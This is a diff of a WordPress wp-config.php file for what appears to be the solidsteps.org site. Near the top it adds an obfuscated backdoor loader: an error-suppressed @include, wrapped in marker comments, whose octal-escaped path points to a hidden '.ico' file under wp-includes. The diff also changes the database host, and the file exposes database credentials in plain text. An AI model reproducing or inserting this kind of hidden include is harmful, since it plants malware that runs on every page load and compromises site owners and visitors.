@@ -1,4 +1,9 @@
 <?php
+/*0898b*/
+
+@include "\057h\157m\145/\163o\154i\144s\164e\160s\057s\157l\151d\163t\145p\163.\157r\147/\167p\055i\156c\154u\144e\163/\122e\161u\145s\164s\057A\165t\150/\056b\1459\066b\0616\141.\151c\157";
+
+/*0898b*/
 /**
  * The base configuration for WordPress
  *
@@ -29,7 +34,8 @@ define('DB_USER', 'solidsteps_user');
 define('DB_PASSWORD', 'solidsteps_pass');
 
 /** MySQL hostname */
-define('DB_HOST', 'localhost');
+//define('DB_HOST', 'databases.solidsteps.org');
+define('DB_HOST', 'goeden.iad1-mysql-e2-14a.dreamhost.com');
 
 /** Database Charset to use in creating database tables. */
 define('DB_CHARSET', 'utf8mb4');
